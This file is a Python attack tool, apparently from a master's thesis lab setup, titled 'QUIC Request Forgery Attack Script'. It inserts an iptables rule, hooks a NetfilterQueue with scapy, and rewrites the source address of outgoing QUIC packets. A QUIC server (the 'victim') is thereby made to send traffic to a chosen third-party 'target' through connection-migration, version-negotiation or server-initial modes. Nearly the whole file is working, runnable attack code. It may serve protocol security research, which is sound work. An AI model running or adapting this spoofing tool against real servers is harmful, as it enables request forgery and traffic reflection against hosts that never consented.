#!/usr/bin/python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import argparse
from argparse import RawTextHelpFormatter


banner = '''
                          ____  _    _ _____ _____                           
                         / __ \| |  | |_   _/ ____|                          
                        | |  | | |  | | | || |                               
                        | |  | | |  | | | || |                               
                        | |__| | |__| |_| || |____                           
  _____                  \___\_\\____/|_____\_____|                          
 |  __ \                          | |   |  ____|                             
 | |__) |___  __ _ _   _  ___  ___| |_  | |__ ___  _ __ __ _  ___ _ __ _   _ 
 |  _  // _ \/ _` | | | |/ _ \/ __| __| |  __/ _ \| '__/ _` |/ _ \ '__| | | |
 | | \ \  __/ (_| | |_| |  __/\__ \ |_  | | | (_) | | | (_| |  __/ |  | |_| |
 |_|  \_\___|\__, |\__,_|\___||___/\__| |_|  \___/|_|  \__, |\___|_|   \__, |
                | |                                     __/ |           __/ |
               _|_|_             _       _____         |___/     _     |___/ 
          /\  | | | |           | |     / ____|         (_)     | |          
         /  \ | |_| |_ __ _  ___| | __ | (___   ___ _ __ _ _ __ | |_         
        / /\ \| __| __/ _` |/ __| |/ /  \___ \ / __| '__| | '_ \| __|        
       / ____ \ |_| || (_| | (__|   <   ____) | (__| |  | | |_) | |_         
      /_/    \_\__|\__\__,_|\___|_|\_\ |_____/ \___|_|  |_| .__/ \__|        
                                                          | |                
                                                          |_|                
'''

SPOOFED_COUNT = 0

# Subprocess Templates
# Change paths to binaries for usage on differnt systems
iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"

lsquic_client_tmpl = "/home/master/quic/yuri-repos/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/master/quic/masterthesis/experiments/keylog -p {path} -K -o scid_len=20"
lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN

#aioquic client only used for VNRF at the moment
aioquic_client_tmpl = "python3 /home/master/quic/yuri-repos/aioquic/examples/http3_client.py -k --cid_len {cid_len} https://{victim_ip}:{victim_port}{path}"

def parse_arguments():

    gen_desc = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=gen_desc)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    #General Options
    optparser = argparse.ArgumentParser(add_help=False)
    optparser.add_argument('victim_ip', help='The victim\'s IP address. The victim is the server the quic connection is established with')
    optparser.add_argument('target_ip', help='The target\'s IP address. The target is the host the forged request is send to')
    optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
    optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
    optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
    optparser.add_argument('--limit','-l', help='Limits the amount of spoofed packets. A value of 0 will not limit the number of packets', type=int, default=0)
    #optparser.add_argument('--debug','-d', help='Turn on stdout and stderr for client subprocesses', action='store_true')
    
    #Additional options for lsquic
    optparser_lsquic = argparse.ArgumentParser(add_help=False)
    optparser_lsquic.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='')
    optparser_lsquic.add_argument('--host','-H', help='Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    optparser_lsquic.add_argument('--version','-V', help='The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')

    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    #Parser for CMRF
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser,optparser_lsquic], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
    parser_cm._optionals.title = 'Optional Arguments'
    parser_cm._positionals.title = 'Required Arguments'

    #Parser for VNRF
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn._optionals.title = 'Optional Arguments'
    parser_vn._positionals.title = 'Required Arguments'
    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(1,256), metavar="[1-255]", type=int, default=20)

    #Parser for SIRF
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser,optparser_lsquic], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si._optionals.title = 'Optional Arguments'
    parser_si._positionals.title = 'Required Arguments'

    return parser.parse_args()


def spoof_packet(packet, ip, port=0):
    
    payload = IP(packet.get_payload())
        
    # Set spoofed source address
    old_ip = payload.src
    payload.src = ip

    old_port = payload.sport
    if port != 0:
        payload.sport = port

    # Recalculate checksums for IP and UDP
    del payload[IP].chksum
    del payload[UDP].chksum
    payload = payload.__class__(bytes(payload))
    packet.set_payload(bytes(payload))
    print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

    return packet


def connection_migration_callback(packet, starttime=0, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return

    if time.time()-starttime > args.start_time:
        packet = spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

    packet.accept()
    

def version_negotiation_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1
    
    packet.accept()
    

def server_initial_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return
    #if SPOOFED_COUNT >= 1: 
    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1

    packet.accept()


def start_client(args):
    cmd = ""
    if args.mode == 'vn':
        cmd = aioquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, cid_len=args.cid_len) 

    if args.mode == 'cm' or args.mode == 'si':
        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
        if args.version != '1':
            cmd += lsquic_client_flag_version.format(version=args.version)     
        if args.alpn != '':
            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
    
    print(cmd)
    return subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        

def main():

    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = parse_arguments()
    print(banner)

    starttime = time.time()
    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    print(iptables_insert)
    subprocess.run(iptables_insert.split())
    
    try:
        #Initializing netfilter queue
        q = NetfilterQueue()
        p = None
        if args.mode == 'cm':
            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
        elif args.mode == 'vn':
            q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
        elif args.mode == 'si':
            q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting quic client")
        p = start_client(args)
        print("[+] Hooking into nfqueue")
        q.run()
    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] Something went wrong!")
        print(e)
    finally:
        print("\n[+] Cleaning up")
        print("[-] Unbinding netfilter queue.")
        q.unbind()
        print("[-] Terminating client process.")
        if p != None:
            p.terminate()
        else:
            print("[!] Client process already gone")
        print("[-] Deleting iptables rule(s).")
        iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
        print(iptables_delete)
        subprocess.run(iptables_delete.split())
        print("[+] Done")


if __name__ == "__main__":
    main()
